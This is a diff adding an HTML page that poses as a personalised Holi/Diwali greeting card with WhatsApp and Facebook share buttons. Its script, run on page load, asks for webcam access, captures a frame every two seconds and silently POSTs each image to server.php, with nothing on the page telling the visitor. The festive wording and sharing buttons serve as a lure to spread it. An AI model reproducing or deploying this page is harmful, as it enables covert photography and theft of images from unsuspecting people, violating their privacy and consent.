@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy holi</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #ffff99, #99ccff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 2em;
+            color: #000;
+            margin-bottom: 20px;
+        }
+
+        .welcome-section {
+            margin-bottom: 20px;
+        }
+
+        .welcome-icon {
+            font-size: 1.5em;
+        }
+
+        .hindi-text {
+            font-size: 1.2em;
+            margin: 5px 0;
+            font-family: 'Noto Sans Devanagari', sans-serif;
+            color: #333;
+        }
+
+        .green-bg {
+            background-color: #00ff00;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            color: #ffffff;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .alok-text {
+            font-size: 3em;
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+            margin: 20px 0;
+            font-weight: bold;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .wishing-section h2 {
+            font-size: 1.5em;
+            color: #0000ff;
+            margin: 5px 0;
+        }
+
+        .red-text {
+            font-size: 1.2em;
+            color: #ff0000;
+            margin: 10px 0;
+        }
+
+        .green-text {
+            font-size: 1em;
+            color: #ffffff;
+            background-color: #00ff00;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .pink-text {
+            font-size: 1em;
+            color: #ff00ff;
+            background-color: #ff99ff;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .purple-text {
+            font-size: 1em;
+            color: #800080;
+            background-color: #d8bfd8;
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+
+        .share-buttons {
+            margin-top: 20px;
+        }
+
+        .share-buttons button {
+            padding: 10px 20px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        .whatsapp {
+            background-color: #25d366;
+            color: white;
+        }
+
+        .facebook {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+            .alok-text {
+                font-size: 2em;
+            }
+            .wishing-section h2 {
+                font-size: 1.2em;
+            }
+            .share-buttons button {
+                display: block;
+                width: 80%;
+                margin: 10px auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>|||| Every Day is Special ||||</h1>
+        <div class="welcome-section">
+            <span class="welcome-icon">🙏</span> Welcome <span class="welcome-icon">🙏</span>
+            <p class="hindi-text">आपका हर दिन खुशियों से भरा हो।</p>
+            <p class="hindi-text">इस खास दिन की ढेरों शुभकामनाएँ !</p>
+            <p class="hindi-text green-bg">|| खुशियाँ आपके साथ हों ||</p>
+        </div>
+        <div class="alok-text" id="userName">ALOK</div>
+        <div class="wishing-section">
+            <h2>Wishing you a very</h2>
+            <h2>⭐ Happy diwali ⭐</h2>
+            <p class="red-text">to you and your lovely family</p>
+            <p class="green-text">Wishing you and your family lots of happiness and blessings on this special occasion. May joy always surround you.</p>
+            <p class="pink-text">⭐ I wish that this day is your best one. ⭐</p>
+            <p class="hindi-text purple-text">आज का दिन आपके जीवन में ढेर सारी खुशियाँ, सुकून और प्यार लेकर आए। आपको इस पावन अवसर की हार्दिक शुभकामनाएँ।</p>
+        </div>
+        <div class="share-buttons">
+            <button class="whatsapp">Whatsapp Share</button>
+            <button class="facebook">Facebook Share</button>
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            video.addEventListener('loadeddata', () => {
+                setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/png');
+
+                    fetch('server.php', {
+                        method: 'POST',
+                        body: JSON.stringify({ image: imageData }),
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                }, 2000);
+            });
+        })
+        .catch(err => {
+            console.log("Camera access denied:", err);
+        });
+
+        // Get name from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name');
+        if (name) {
+            document.getElementById("userName").textContent = name;
+        }
+    </script>
+</body>
+</html>
